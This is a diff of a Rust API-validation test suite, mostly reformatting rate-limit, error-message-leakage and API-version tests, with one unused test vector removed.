-                Some("valid_token_123")), // Second call within rate limit
-            ),
-        ];
+        // Removed unused test_cases vector - direct testing below
 
         // Trigger rate limiting
-        for _ in 0..=10 {  // Exceed rate limit
+        for _ in 0..=10 {
+            // Exceed rate limit
             let _ = security_validator.validate_request(
                 "leak_test_client",
                 Some("https://localhost"),
                 Some("application/json"),
                 100,
-                Some("valid_token_123")
+                Some("valid_token_123"),
             );
         }
 
@@ -1454,21 +1531,24 @@ impl APIValidationTestSuite {
             Some("https://localhost"),
             Some("application/json"),
             100,
-            Some("valid_token_123")
+            Some("valid_token_123"),
         );
 
         match result {
             Err(NetworkError::HTTPError { reason, .. }) => {
                 // Check that error message doesn't contain sensitive info
                 let sensitive_keywords = vec![
-                    "password", "token", "secret", "key", "internal", "database",
-                    "server", "system", "config", "admin", "root"
+                    "password", "token", "secret", "key", "internal", "database", "server",
+                    "system", "config", "admin", "root",
                 ];
-                
+
                 let reason_lower = reason.to_lowercase();
                 for keyword in sensitive_keywords {
                     if reason_lower.contains(keyword) {
-                        eprintln!("Error message may leak sensitive information: contains '{}'", keyword);
+                        eprintln!(
+                            "Error message may leak sensitive information: contains '{}'",
+                            keyword
+                        );
                         all_passed = false;
                     }
                 }
@@ -1478,7 +1558,7 @@ impl APIValidationTestSuite {
                     eprintln!("Rate limit error should mention rate limiting");
                     all_passed = false;
                 }
-            },
+            }
             _ => {
                 eprintln!("Should get rate limit error");
                 all_passed = false;
@@ -1491,19 +1571,23 @@ impl APIValidationTestSuite {
             Some("https://localhost"),
             Some("application/json"),
             100,
-            Some("invalid_token") // Invalid token
+            Some("invalid_token"), // Invalid token
         );
 
         match result {
-            Err(NetworkError::HTTPError { status: Some(401), reason }) => {
+            Err(NetworkError::HTTPError {
+                status: Some(401),
+                reason,
+            }) => {
                 // Should be generic authentication error
-                if reason.contains("database") || 
-                   reason.contains("user not found") ||
-                   reason.contains("specific details about why auth failed") {
+                if reason.contains("database")
+                    || reason.contains("user not found")
+                    || reason.contains("specific details about why auth failed")
+                {
                     eprintln!("Authentication error should not leak implementation details");
                     all_passed = false;
                 }
-            },
+            }
             _ => {
                 eprintln!("Should get 401 authentication error");
                 all_passed = false;
@@ -1545,7 +1629,11 @@ impl APIValidationTestSuite {
         for version in supported_versions {
             let result = validate_api_version(version);
             if result.is_err() {
-                eprintln!("Supported API version '{}' should be accepted: {:?}", version, result.err());
+                eprintln!(
+                    "Supported API version '{}' should be accepted: {:?}",
+                    version,
+                    result.err()
+                );
                 all_passed = false;
             }
         }
@@ -1554,11 +1642,16 @@ impl APIValidationTestSuite {
         for version in deprecated_versions {
             let result = validate_api_version(version);
             match result {
-                Err(NetworkError::HTTPError { status: Some(410), .. }) => {
+                Err(NetworkError::HTTPError {
+                    status: Some(410), ..
+                }) => {
                     // Expected deprecated API response
-                },
+                }
                 _ => {
-                    eprintln!("Deprecated API version '{}' should return 410 Gone", version);
+                    eprintln!(
+                        "Deprecated API version '{}' should return 410 Gone",
+                        version
+                    );
                     all_passed = false;
                 }
             }
@@ -1568,11 +1661,16 @@ impl APIValidationTestSuite {
         for version in invalid_versions {
             let result = validate_api_version(version);
             match result {
-                Err(NetworkError::HTTPError { status: Some(400), .. }) => {
+                Err(NetworkError::HTTPError {
+                    status: Some(400), ..
+                }) => {
                     // Expected invalid version response
-                },
+                }
                 _ => {
-                    eprintln!("Invalid API version '{}' should return 400 Bad Request", version);
+                    eprintln!(
+                        "Invalid API version '{}' should return 400 Bad Request",
+                        version
+                    );
                     all_passed = false;
                     self.security_violations_detected += 1;
                 }
@@ -1612,7 +1710,7 @@ impl APIValidationTestSuite {
 
     fn record_test_result(&mut self, test_name: &str, duration: Duration, passed: bool) {
         self.test_count += 1;
-        
+
         if passed {
             self.passed_tests += 1;
             println!("✓ {} completed in {:.2}ms", test_name, duration.as_millis());
@@ -1627,9 +1725,18 @@ impl APIValidationTestSuite {
         println!("Total Tests: {}", self.test_count);
         println!("Passed: {}", self.passed_tests);
         println!("Failed: {}", self.failed_tests);
-        println!("Success Rate: {:.1}%", (self.passed_tests as f64 / self.test_count as f64) * 100.0);
-        println!("Security Violations Detected: {}", self.security_violations_detected);
-        println!("Input Validation Failures: {}", self.input_validation_failures);
+        println!(
+            "Success Rate: {:.1}%",
+            (self.passed_tests as f64 / self.test_count as f64) * 100.0
+        );
+        println!(
+            "Security Violations Detected: {}",
+            self.security_violations_detected
+        );
+        println!(
+            "Input Validation Failures: {}",
+            self.input_validation_failures
+        );
     }
 }
 
@@ -1637,9 +1744,18 @@ impl APIValidationTestSuite {
 async fn run_api_validation_tests() {
     let mut test_suite = APIValidationTestSuite::new();
     test_suite.run_all_tests().await;
-    
+
     // Ensure all tests passed
-    assert!(test_suite.failed_tests == 0, "All API validation tests should pass");
-    assert!(test_suite.passed_tests > 15, "Should have comprehensive test coverage");
-    assert!(test_suite.security_violations_detected > 0, "Should have detected security violations in tests");
+    assert!(
+        test_suite.failed_tests == 0,
+        "All API validation tests should pass"
+    );
+    assert!(
+        test_suite.passed_tests > 15,
+        "Should have comprehensive test coverage"
+    );
+    assert!(
+        test_suite.security_violations_detected > 0,
+        "Should have detected security violations in tests"
+    );
 }
